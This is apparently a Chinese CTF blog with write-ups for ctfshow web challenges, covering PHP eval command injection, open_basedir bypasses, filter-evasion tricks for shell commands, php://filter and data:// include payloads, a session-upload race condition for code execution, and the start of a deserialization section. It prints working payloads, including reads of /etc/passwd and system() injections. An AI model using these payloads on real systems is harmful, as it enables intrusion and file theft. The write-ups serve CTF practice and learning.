<p>这题终于不一样了(其实就是flag换地方了)，我们用上述方法找不到flag</p>
<p>我们先扫描目录</p>
<p>c=print_r(scadir(‘/’));</p>
<p>发现flag.txt</p>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>进去</p>
<h1>web67</h1>
<p>这道题用正常思路，不猜flag在那个文件</p>
<p>先扫描目录，发现我们之前用的print_r()函数被禁掉了，用var_dump()函数来代替</p>
<table>
<thead>
<tr>
<th>print_r()输出[name] =&gt; John</th>
</tr>
</thead>
<tbody>
<tr>
<td>var_dump()输出[“name”]=&gt;     string(4) “John”。</td>
</tr>
<tr>
<td><code>var_dump()</code> 更侧重于变量的详细信息，而 <code>print_r()</code> 更侧重于变量的结构和易读性。就如把name的类型打印出来（String类型，4个字符）</td>
</tr>
</tbody>
</table>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>ctfshow{32ceca18-433a-441a-90c3-d9038047ef44}</p>
<h1>web68</h1>
<p>这道题通杀答案highlight_file()被噶了</p>
<p>通过扫描目录，还是在txt里面，应该是变量输出啊应该，要不然以现有知识应该搞不出来</p>
<p>c=include(‘/flag.txt’);这里不用echo，否则flag下面会出现一行报错（不影响我们拿flag）</p>
<p>为什么不用echo？</p>
<p>因为flag.txt里面没有php标签**<code>&lt;?php...?&gt;</code>**，然后我们通过html打开了他，他默认会输出内容</p>
<p>ctfshow{882c2f13-b515-413e-8857-67c1005072f4}</p>
<h1>web69</h1>
<p>这一题var_dump()也被禁掉了，用var_export()代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;name&#x27; =&gt; &#x27;John&#x27;</span><br></pre></td></tr></table></figure>
<p>与var_dump的区别就是数组的话用建值来显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 =&gt; &#x27;reading&#x27;,</span><br></pre></td></tr></table></figure>
<p>c=include(‘/flag.txt’);</p>
<p>ctfshow{2e64a68d-2b05-46ba-9bb6-0df1ea8145b6}</p>
<p>web70</p>
<p>同web69</p>
<p>但是这道题进去的页面提醒我了error_reporting()、ini_set()是不是也可以拿到flag？</p>
<p>然后再插进去一个知识scandir()如果被禁用了，用glob()代替</p>
<p>ctfshow{5b059330-5c9e-43f5-86ce-d8e59c3ee207}</p>
<p>web71</p>
<p>c=var_export(scandir(‘/’));扫描出来个emmm</p>
<p><img src="image-20250121220335830.png" alt="image-20250121220335830"></p>
<p>六百六十六，演都不演了</p>
<p>对了，还给有附件了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>ob_get_contents()：得到缓冲区的内容（数据）。<br>
ob_end_clean()：会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br>
preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变量$s的内容都替换为问号。用之前payload发现输出的一大堆问号，就是因为这句话。</p>
<p>方法一：wp:其人之道还之其人之身</p>
<p>c=include(“/flag.txt”);$ss=ob_get_contents();ob_end_clean();echo $ss;</p>
<p>方法二：当执行完eval()之后就结束代码进程</p>
<p>c=include(‘/flag.txt’);exit();</p>
<p>c=include(‘/flag.txt’);die();</p>
<p>ctfshow{d7a57ee7-b124-4ca2-b99d-2fa14ac563d1}</p>
<h1>web72</h1>
<p>源码不变</p>
<p>web71的方法不行了</p>
<p>我们var_export(scandir(‘/’));die();读取不了目录</p>
<p>open_basedir()函数限制了php能够操作的目录，在后面说明了限制在的操作的目录/var/www/html/</p>
<p>这时我们可以用到glob()函数，此函数属于伪协议的一种。</p>
<p>glob伪协议在筛选目录时不受open_basedir制约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">	# 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span><br><span class="line">	# glob:// — 查找匹配的文件路径模式</span><br><span class="line">	# DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>不管了，这道题还需要分析大佬的脚本，贼jb长，老婆娘的裹脚布，又臭又长</p>
<p>web73</p>
<p>正常走流程</p>
<p>知识文件名变了</p>
<p>ctfshow{6020494c-3f4c-42d3-9c23-0b540119fb20}</p>
<p>web74</p>
<p>scandir()被禁用了</p>
<p>c=var_export(glob(‘/*’));die();</p>
<p>c=include(‘/flagx.txt’);die();</p>
<p>web75</p>
<p>利用<code>mysql</code>的<code>load_file</code>读文件，绕过<code>open_basedir</code> 限制。（只限制了PHP的访问目录，不关MYSQL的事情）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不写了，后面的都太麻烦了，集中一下关键词了</p>
<p>fuzz、</p>
<p>c了，为什么这么不爽，后面这么难，</p>
<h1>总结</h1>
<p>1.<strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<p>2.<strong>cat过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>3.<strong>php无需括号的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>4.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
<ol start="5">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>?c=require$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</th>
</tr>
</thead>
<tbody>
<tr>
<td>和</td>
</tr>
<tr>
<td><strong>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</strong></td>
</tr>
<tr>
<td>的区别是：有引号，优先执行</td>
</tr>
</tbody>
</table>
<p>6.文件包含时，如果题目源码当中又出现了一个包含函数(web37)，那么我们可以用data</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>7.如6.当中的代码，如果题目过滤了php，我们可以将&lt;?php换成&lt;?=</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>或者我们将后面的进行base64编码，不能用cat</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==          <span class="comment"># &lt;?php system(&quot;nl flag.php &quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="9">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>localeconv() 函数会返回一个包含本地环境信息的数组</th>
</tr>
</thead>
<tbody>
<tr>
<td>**pos()**和 **current()**是等价的函数，它们会返回数组的当前元素。对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag这四个字符</td>
</tr>
<tr>
<td>**scandir()**函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</td>
</tr>
<tr>
<td>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</td>
</tr>
<tr>
<td>**array_reverse()**函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</td>
</tr>
<tr>
<td><strong>next(</strong>)函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</td>
</tr>
<tr>
<td>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</td>
</tr>
<tr>
<td><strong>show_source()</strong> 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</td>
</tr>
</tbody>
</table>
<ol start="10">
<li></li>
</ol>
<p>12.<strong>&gt;/dev/null 2&gt;&amp;1</strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</p>
<p>13.命令分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>14.<strong>空格过滤指过滤了“ ”和“%20”</strong></p>
<p>15.<strong>过滤了数字，但是%09不属于数字</strong>.<code>%09</code> 表示水平制表符（Tab）的编码形式。相当于空格</p>
<p>16.**&lt;&gt;**与html编程有关，这个好像可以弄出来一个空格</p>
<p>17.<strong>反斜杠</strong>\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code>，如果cat被过滤，ca\t可以绕过。</p>
<p>18.**‘’**两个双引号同\一样</p>
<p>19.<strong>grep test *file</strong>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;&#123;&#x27; flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;ctfshow flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 ctfshow的这一行</p>
<ol start="20">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=mv fla?.php b.txt</span><br></pre></td></tr></table></figure>
<p>将flag.php移动到b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>21.**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等.web55</p>
<p>22.<strong>/usr/bin目录</strong>:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。web55</p>
<p>23.<strong>造一个post上传文件的数据包</strong>web56</p>
<p>24.<strong>算术扩展（Arithmetic Expansion）运算</strong>web57</p>
<p>25.<strong>php标签</strong><code>&lt;?php...?&gt;</code></p>
<p>26.<strong>结束代码进程</strong>exit();die();</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web82-86竞争</title>
    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
    <content><![CDATA[<h1>web82</h1>
<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件随便上传一个</p>
<p>发送到i(爆破)</p>
<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
<p>?file=/tmp/sess_flag</p>
<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
<p>此处设置 null payload 以及 无限重复</p>
<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
<p>新建一个资源池，设置线程为30</p>
<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
<h1>web83</h1>
<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
<p>我这web82的保存下来了</p>
<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
<h1>web84</h1>
<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
<h1>web85</h1>
<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
<h1>web86</h1>
<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
]]></content>
      <tags>
        <tag>web竞争</tag>
      </tags>
  </entry>
  <entry>
    <title>搞砸了</title>
    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
]]></content>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1>web254</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我让ai分析了一下源码，然后他说让账号密码全是xxxxxx就可以…</p>
<p>确实可以</p>
<p>代码逻辑就是判断账号密码是否符合预期的，如果符合，则返回isVip=true;最终拿到flag</p>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{589d4adb-b0ca-420d-9b64-d73d49a855de}</p>
<h1>web255</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 